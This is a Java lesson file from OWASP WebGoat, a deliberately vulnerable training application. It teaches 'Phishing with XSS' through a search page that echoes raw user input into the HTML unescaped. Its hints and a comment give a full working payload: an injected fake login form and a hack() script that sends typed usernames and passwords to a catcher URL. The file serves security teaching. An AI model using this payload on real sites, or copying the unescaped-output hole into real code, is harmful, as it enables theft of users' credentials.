
package org.owasp.webgoat.lessons;

import java.util.ArrayList;
import java.util.List;
import org.apache.ecs.Element;
import org.apache.ecs.ElementContainer;
import org.apache.ecs.StringElement;
import org.apache.ecs.html.B;
import org.apache.ecs.html.BR;
import org.apache.ecs.html.Comment;
import org.apache.ecs.html.H1;
import org.apache.ecs.html.HR;
import org.apache.ecs.html.Input;
import org.apache.ecs.html.TD;
import org.apache.ecs.html.TH;
import org.apache.ecs.html.TR;
import org.apache.ecs.html.Table;
import org.owasp.webgoat.Catcher;
import org.owasp.webgoat.session.ECSFactory;
import org.owasp.webgoat.session.WebSession;


/***************************************************************************************************
 * 
 * 
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
 * please see http://www.owasp.org/
 * 
 * Copyright (c) 2002 - 2007 Bruce Mayhew
 * 
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 * 
 * Getting Source ==============
 * 
 * Source for this application is maintained at code.google.com, a repository for free software
 * projects.
 * 
 * For details, please see http://code.google.com/p/webgoat/
 * 
 * @author Bruce Mayhew <a href="http://code.google.com/p/webgoat">WebGoat</a>
 * @created March 13, 2007
 */
public class Phishing extends LessonAdapter
{

	/**
	 * Description of the Field
	 */
	protected final static String SEARCH = "Username";
	private String searchText;

	/**
	 * Description of the Method
	 * 
	 * @param s
	 *            Description of the Parameter
	 * @return Description of the Return Value
	 */
	private boolean postedCredentials(WebSession s)
	{
		String postedToCookieCatcher = getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY,
																								Catcher.EMPTY_STRING);

		// <START_OMIT_SOURCE>
		return (!postedToCookieCatcher.equals(Catcher.EMPTY_STRING));
		// <END_OMIT_SOURCE>
	}

	/**
	 * Description of the Method
	 * 
	 * @param s
	 *            Description of the Parameter
	 * @return Description of the Return Value
	 */
	protected Element createContent(WebSession s)
	{
		ElementContainer ec = new ElementContainer();

		try
		{
			searchText = s.getParser().getRawParameter(SEARCH, "");
			// <START_OMIT_SOURCE>
			// <END_OMIT_SOURCE>

			ec.addElement(makeSearch(s));
			if (postedCredentials(s))
			{
				makeSuccess(s);
			}
		} catch (Exception e)
		{
			s.setMessage("Error generating " + this.getClass().getName());
		}

		return (ec);
	}

	protected Element makeSearch(WebSession s)
	{
		ElementContainer ec = new ElementContainer();

		ec.addElement(new H1().addElement("WebGoat Search "));
		Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign("center");

		TR tr = new TR();
		tr.addElement(new TD().addElement("&nbsp;").setColSpan(2));
		t.addElement(tr);
		if (s.isColor())
		{
			t.setBorder(1);
		}

		tr = new TR();
		tr.addElement(new TH().addElement("This facility will search the WebGoat source.").setColSpan(2)
				.setAlign("center"));
		t.addElement(tr);

		tr = new TR();
		tr.addElement(new TD().addElement("&nbsp;").setColSpan(2));
		t.addElement(tr);

		TR row1 = new TR();
		row1.addElement(new TD(new B(new StringElement("Search: "))).setAlign("right"));

		Input input1 = new Input(Input.TEXT, SEARCH, searchText);
		row1.addElement(new TD(input1).setAlign("left"));
		t.addElement(row1);

		Element b = ECSFactory.makeButton("Search");
		t.addElement(new TR(new TD(b).setColSpan(2)).setAlign("center"));
		ec.addElement(t);

		if (!searchText.equals(""))
		{
			ec.addElement(new BR());
			ec.addElement(new HR());
			ec.addElement(new BR());
			ec.addElement(new StringElement("Results for: " + searchText));
			ec.addElement(new Comment("Search results"));
			ec.addElement(new BR());
			ec.addElement(new BR());
			ec.addElement(new B(new StringElement("No results were found.")));
			ec.addElement(new Comment("End of Search results"));
		}

		return (ec);
	}

	/**
	 * Gets the hints attribute of the CluesScreen object
	 * 
	 * @return The hints value
	 */
	protected List<String> getHints(WebSession s)
	{
		List<String> hints = new ArrayList<String>();
		hints.add("Try adding HTML to the search field to create a fake authentication form.<BR>"
				+ "Try to make the form look official.");
		hints
				.add("Try: <BR> "
						+ "password&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
		hints
				.add("Add functionality that can post a request, a button might work<BR><BR>"
						+ "After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>"
						+ "http://localhost/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE");
		hints
				.add("Try: <BR> "
						+ "&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
						+ "value=&quot;login&quot;&gt;"
						+ "<BR><BR>Solution for this hint:<BR><BR>"
						+ "password&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
		hints
				.add("Make the button perform an action on submit, <BR>"
						+ "adding an onclick=\"hack()\" might work<BR>"
						+ "Don't forget to add the hack() javascript function"
						+ "<BR><BR>Solution for this hint:<BR><BR>"
						+ "password&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
		hints
				.add("You need to create the hack() function.  This function will pull the credentials from the "
						+ "webpage and post them to the WebGoat catcher servlet. <BR>"
						+ "<BR> Some useful code snippets:<UL>"
						+ "<LI>doucument.forms[0].user.value - will access the user field"
						+ "<LI>XssImage = new Image(); XssImage.src=SOME_URL = will perform a post"
						+ "<LI>javascript string concatentation uses a \"+\" </UL>"
						+ "<BR><BR>Solution for this hint():<BR><BR>"
						+ "password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen."
						+ "\nUser Name = &quot; + document.forms[0].user.value + &quot;\nPassword = &quot; +  document.forms[0].pass.value); "
						+ "XSSImage=new Image; XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+"
						+ "document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}"
						+ "&lt;/script&gt;");
		hints
				.add("Complete solution for this lesson:<BR><BR>"
						+ "password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen."
						+ "\nUser Name = &quot; + document.forms[0].user.value + &quot;\nPassword = &quot; +  document.forms[0].pass.value); "
						+ "XSSImage=new Image; XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+"
						+ "document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}"
						+ "&lt;/script&gt;&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
		/**
		 * password<script>function hack(){ alert("Had this been a real attack... Your credentials
		 * were just stolen.\nUser Name = " + document.forms[0].user.value + "\nPassword = " +
		 * document.forms[0].pass.value); XSSImage=new Image;
		 * XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="
		 * +document.forms[0].user.value + "&password=" + document.forms[0].pass.value +
		 * "";}</script><form><br>
		 * <br>
		 * <HR>
		 * <H3>This feature requires account login:</H2> <br>
		 * <br>
		 * Enter Username:<br>
		 * <input type="text" id="user" name="user"><br>
		 * Enter Password:<br>
		 * <input type="password" name = "pass"><br>
		 * <input type="submit" name="login" value="login" onclick="hack()"></form><br>
		 * <br>
		 * <HR>
		 * <!--
		 * 
		 */
		return hints;
	}

	/**
	 * Gets the instructions attribute of the XssSearch object
	 * 
	 * @return The instructions value
	 */
	public String getInstructions(WebSession s)
	{
		String instructions = "This lesson is an example of how a website might support a phishing attack<BR><BR>"
				+ "Below is an example of a standard search feature.<br>"
				+ "Using XSS and HTML insertion, your goal is to: <UL>"
				+ "<LI>Insert html to that requests credentials"
				+ "<LI>Add javascript to actually collect the credentials"
				+ "<LI>Post the credentials to http://localhost/WebGoat/catcher?PROPERTY=yes...</UL> "
				+ "To pass this lesson, the credentials must be posted to the catcher servlet.<BR>";

		return (instructions);
	}

	private final static Integer DEFAULT_RANKING = new Integer(30);

	protected Integer getDefaultRanking()
	{
		return DEFAULT_RANKING;
	}

	/**
	 * Gets the category attribute of the FailOpenAuthentication object
	 * 
	 * @return The category value
	 */
	protected Category getDefaultCategory()
	{
		return Category.XSS;
	}

	/**
	 * Gets the title attribute of the CluesScreen object
	 * 
	 * @return The title value
	 */
	public String getTitle()
	{
		return ("Phishing with XSS");
	}

}
